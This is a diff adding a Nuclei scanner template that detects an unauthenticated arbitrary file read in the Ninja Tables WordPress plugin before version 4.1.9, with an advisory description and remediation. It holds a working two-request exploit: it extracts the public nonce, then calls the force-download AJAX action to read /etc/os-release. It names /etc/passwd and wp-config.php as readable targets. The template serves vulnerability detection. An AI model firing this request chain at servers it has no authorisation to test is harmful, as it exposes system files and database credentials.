@@ -1,0 +1,61 @@
+id: wp-ninja-tables-lfi
+
+info:
+  name: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
+  author: xbow,DhiyaneshDk
+  severity: high
+  description: |
+    The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable to an unauthenticated arbitrary file download vulnerability. The issue exists due to the improper validation of the 'url' parameter in the 'ninja_table_force_download' AJAX action.
+  impact: |
+    An unauthenticated attacker can download sensitive files from the server, such as '/etc/passwd' or '/wp-config.php', potentially exposing sensitive information including database credentials.
+  remediation: |
+    Update the Ninja Tables plugin to version 4.1.9 or later.
+  reference:
+    - https://xbow.com/blog/xbow-ninja-tables/
+    - https://ninjatables.com/docs/change-log/#521-date-july-9-2025
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: wpxpo
+    product: ninja-tables
+    fofa-query: body="/wp-content/plugins/ninja-tables/"
+  tags: ninja-tables,file-download,wordpress,unauth,lfi,wp-plugin
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, "ninja_table")
+        internal: true
+
+    extractors:
+      - type: regex
+        name: public_nonce
+        part: body
+        group: 1
+        regex:
+          - '"ninja_table_public_nonce":"([a-z0-9]+)"'
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(content_type, "application/octet-stream")
+          - status_code == 200
+          - contains(body, "PRETTY_NAME=")
+        condition: and
+# digest: 490a0046304402201c1afbe6c0dc3b57ec40c97b0f8f706b25753ad285bb53ac37791e50838bcdcd022032ca2a8dcd160d22ef4fffb0f424bb5ab4aaf6cd2e0aa19cae1b064850498dc2:922c64590222798bb761d5b6d8e72950
